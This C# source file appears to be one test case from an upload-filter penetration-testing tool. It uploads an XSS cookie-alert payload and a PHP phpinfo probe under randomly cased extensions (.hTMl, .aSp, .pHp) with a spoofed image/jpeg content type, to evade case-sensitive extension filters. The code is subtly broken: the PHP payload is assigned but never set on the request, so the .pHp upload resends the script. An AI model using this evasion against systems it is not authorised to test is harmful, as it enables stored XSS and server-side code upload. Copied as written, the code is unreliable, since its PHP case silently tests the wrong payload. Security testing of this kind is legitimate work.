using System.Text;
using System.Threading.Tasks;

/*
* Test #4
* Description: This test tries to upload files with randomly cased extensions.
* This will evade any filters looking for extensions in a single case.
*/
namespace Upsploit.Tests {
    class Test04 : Test {
        internal override async Task runTest(UploadRequest.UploadRequest request) {
            string data = "<script>alert(document.cookie)</script>";

            request.setFileData(Encoding.ASCII.GetBytes(data));
            request.setFileContentType("image/jpeg"); //Default all files to image/jpeg

            //HTML case sensitivity test
            request.setFileName("Test_4" + ".hTMl");
            await request.send();
            printResult(request, "Test 4 (.hTMl)");

            //ASP case sensitivity test
            request.setFileName("Test_4" + ".aSp");
            await request.send();
            printResult(request, "Test 4 (.aSp)");

            //Change contents for php test
            data = "<?php\n"
                 + "  echo phpinfo();\n"
                 + "?>";
            //PHP case sensitivity test
            request.setFileName("Test_4" + ".pHp");
            await request.send();
            printResult(request, "Test 4 (.pHp)");
        }
    }
}
